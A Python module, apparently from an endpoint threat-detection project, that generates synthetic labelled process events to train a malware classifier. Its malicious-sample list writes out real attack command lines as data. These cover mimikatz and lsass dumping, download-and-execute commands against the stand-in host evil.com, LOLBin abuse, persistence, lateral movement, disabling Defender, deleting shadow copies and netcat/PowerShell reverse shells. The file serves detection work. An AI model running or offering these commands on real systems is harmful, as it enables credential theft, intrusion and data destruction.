"""
Training Data Generator
Generates synthetic training data based on real threat patterns.
Uses MITRE ATT&CK techniques and known malware behaviors.
"""

import random
import string
from typing import List, Tuple, Dict
from datetime import datetime

from .feature_extractor import AdvancedFeatureExtractor


class SyntheticDataGenerator:
    """Generate synthetic training data for threat detection."""
    
    def __init__(self):
        self.extractor = AdvancedFeatureExtractor()
        
        # Benign process patterns
        self.benign_processes = [
            {'name': 'chrome.exe', 'exe': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'cmdline': 'chrome.exe --type=renderer'},
            {'name': 'explorer.exe', 'exe': 'C:\\Windows\\explorer.exe', 'cmdline': 'C:\\Windows\\explorer.exe'},
            {'name': 'svchost.exe', 'exe': 'C:\\Windows\\System32\\svchost.exe', 'cmdline': 'C:\\Windows\\System32\\svchost.exe -k netsvcs'},
            {'name': 'notepad.exe', 'exe': 'C:\\Windows\\System32\\notepad.exe', 'cmdline': 'notepad.exe document.txt'},
            {'name': 'code.exe', 'exe': 'C:\\Users\\User\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe', 'cmdline': 'code.exe .'},
            {'name': 'python.exe', 'exe': 'C:\\Python311\\python.exe', 'cmdline': 'python.exe script.py'},
            {'name': 'outlook.exe', 'exe': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'cmdline': 'outlook.exe'},
            {'name': 'teams.exe', 'exe': 'C:\\Users\\User\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', 'cmdline': 'teams.exe'},
            {'name': 'slack.exe', 'exe': 'C:\\Users\\User\\AppData\\Local\\slack\\slack.exe', 'cmdline': 'slack.exe'},
            {'name': 'firefox.exe', 'exe': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'cmdline': 'firefox.exe'},
        ]
        
        # Malicious process patterns
        self.malicious_processes = [
            # Credential theft
            {'name': 'mimikatz.exe', 'exe': 'C:\\Temp\\mimikatz.exe', 'cmdline': 'mimikatz.exe sekurlsa::logonpasswords'},
            {'name': 'procdump.exe', 'exe': 'C:\\Users\\Public\\procdump.exe', 'cmdline': 'procdump.exe -ma lsass.exe lsass.dmp'},
            
            # Encoded PowerShell
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 
             'cmdline': 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=='},
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
             'cmdline': 'powershell.exe -windowstyle hidden -executionpolicy bypass -file C:\\Temp\\script.ps1'},
            
            # Download and execute
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
             'cmdline': 'powershell.exe IEX(New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'},
            {'name': 'certutil.exe', 'exe': 'C:\\Windows\\System32\\certutil.exe',
             'cmdline': 'certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\\Temp\\malware.exe'},
            {'name': 'bitsadmin.exe', 'exe': 'C:\\Windows\\System32\\bitsadmin.exe',
             'cmdline': 'bitsadmin.exe /transfer job /download /priority high http://evil.com/mal.exe C:\\Temp\\mal.exe'},
            
            # LOLBins
            {'name': 'mshta.exe', 'exe': 'C:\\Windows\\System32\\mshta.exe',
             'cmdline': 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell"", 0:close")'},
            {'name': 'regsvr32.exe', 'exe': 'C:\\Windows\\System32\\regsvr32.exe',
             'cmdline': 'regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll'},
            {'name': 'rundll32.exe', 'exe': 'C:\\Windows\\System32\\rundll32.exe',
             'cmdline': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write()'},
            
            # Persistence
            {'name': 'schtasks.exe', 'exe': 'C:\\Windows\\System32\\schtasks.exe',
             'cmdline': 'schtasks.exe /create /tn "Updater" /tr "C:\\Temp\\malware.exe" /sc onlogon'},
            {'name': 'reg.exe', 'exe': 'C:\\Windows\\System32\\reg.exe',
             'cmdline': 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Temp\\mal.exe'},
            
            # Lateral movement
            {'name': 'psexec.exe', 'exe': 'C:\\Temp\\psexec.exe',
             'cmdline': 'psexec.exe \\\\192.168.1.100 -u admin -p password cmd.exe'},
            {'name': 'wmic.exe', 'exe': 'C:\\Windows\\System32\\wbem\\wmic.exe',
             'cmdline': 'wmic.exe /node:192.168.1.100 process call create "cmd.exe /c whoami"'},
            
            # Defense evasion
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
             'cmdline': 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true'},
            {'name': 'sc.exe', 'exe': 'C:\\Windows\\System32\\sc.exe',
             'cmdline': 'sc.exe stop WinDefend'},
            
            # Ransomware indicators
            {'name': 'vssadmin.exe', 'exe': 'C:\\Windows\\System32\\vssadmin.exe',
             'cmdline': 'vssadmin.exe delete shadows /all /quiet'},
            {'name': 'bcdedit.exe', 'exe': 'C:\\Windows\\System32\\bcdedit.exe',
             'cmdline': 'bcdedit.exe /set {default} recoveryenabled no'},
            
            # Reverse shells
            {'name': 'nc.exe', 'exe': 'C:\\Temp\\nc.exe',
             'cmdline': 'nc.exe -e cmd.exe 10.0.0.1 4444'},
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
             'cmdline': 'powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.0.0.1\',4444)"'},
        ]
        
        # Suspicious but not necessarily malicious
        self.suspicious_processes = [
            {'name': 'cmd.exe', 'exe': 'C:\\Windows\\System32\\cmd.exe', 'cmdline': 'cmd.exe /c whoami'},
            {'name': 'powershell.exe', 'exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
             'cmdline': 'powershell.exe Get-Process'},
            {'name': 'net.exe', 'exe': 'C:\\Windows\\System32\\net.exe', 'cmdline': 'net.exe user'},
            {'name': 'ipconfig.exe', 'exe': 'C:\\Windows\\System32\\ipconfig.exe', 'cmdline': 'ipconfig.exe /all'},
        ]
    
    def _add_noise(self, event: Dict) -> Dict:
        """Add random variations to event data."""
        event = event.copy()
        
        # Randomly modify paths
        if random.random() < 0.3:
            event['exe'] = event['exe'].replace('C:\\', 'D:\\')
        
        # Add random user
        users = ['User', 'Admin', 'John', 'SYSTEM', 'NetworkService']
        event['user'] = random.choice(users)
        
        # Add parent process
        parents = ['explorer.exe', 'cmd.exe', 'powershell.exe', 'services.exe', 'svchost.exe']
        event['parent_name'] = random.choice(parents)
        
        return event
    
    def generate_benign_sample(self) -> Tuple[List[float], int]:
        """Generate a benign sample."""
        event = random.choice(self.benign_processes).copy()
        event = self._add_noise(event)
        features = self.extractor.extract_all_features(event)
        return features, 0
    
    def generate_malicious_sample(self) -> Tuple[List[float], int]:
        """Generate a malicious sample."""
        event = random.choice(self.malicious_processes).copy()
        event = self._add_noise(event)
        features = self.extractor.extract_all_features(event)
        return features, 1
    
    def generate_suspicious_sample(self) -> Tuple[List[float], int]:
        """Generate a suspicious (borderline) sample."""
        event = random.choice(self.suspicious_processes).copy()
        event = self._add_noise(event)
        features = self.extractor.extract_all_features(event)
        # 30% chance of being labeled malicious
        label = 1 if random.random() < 0.3 else 0
        return features, label
    
    def generate_dataset(self, n_samples: int = 5000, 
                        malicious_ratio: float = 0.3) -> Tuple[List[List[float]], List[int]]:
        """
        Generate a balanced dataset for training.
        
        Args:
            n_samples: Total number of samples
            malicious_ratio: Ratio of malicious samples (0.0-1.0)
            
        Returns:
            Tuple of (features, labels)
        """
        X = []
        y = []
        
        n_malicious = int(n_samples * malicious_ratio)
        n_suspicious = int(n_samples * 0.1)  # 10% suspicious
        n_benign = n_samples - n_malicious - n_suspicious
        
        # Generate benign samples
        for _ in range(n_benign):
            features, label = self.generate_benign_sample()
            X.append(features)
            y.append(label)
        
        # Generate malicious samples
        for _ in range(n_malicious):
            features, label = self.generate_malicious_sample()
            X.append(features)
            y.append(label)
        
        # Generate suspicious samples
        for _ in range(n_suspicious):
            features, label = self.generate_suspicious_sample()
            X.append(features)
            y.append(label)
        
        # Shuffle
        combined = list(zip(X, y))
        random.shuffle(combined)
        X, y = zip(*combined)
        
        return list(X), list(y)
    
    def get_feature_names(self) -> List[str]:
        """Get feature names."""
        return self.extractor.feature_names


def generate_and_train(detector, n_samples: int = 5000):
    """Generate synthetic data and train the detector."""
    generator = SyntheticDataGenerator()
    
    print(f"Generating {n_samples} synthetic samples...")
    X, y = generator.generate_dataset(n_samples)
    
    print(f"Training on {len(X)} samples ({sum(y)} malicious, {len(y)-sum(y)} benign)...")
    detector.train_on_data(X, y, generator.get_feature_names())
    
    print("Training complete!")
    return X, y
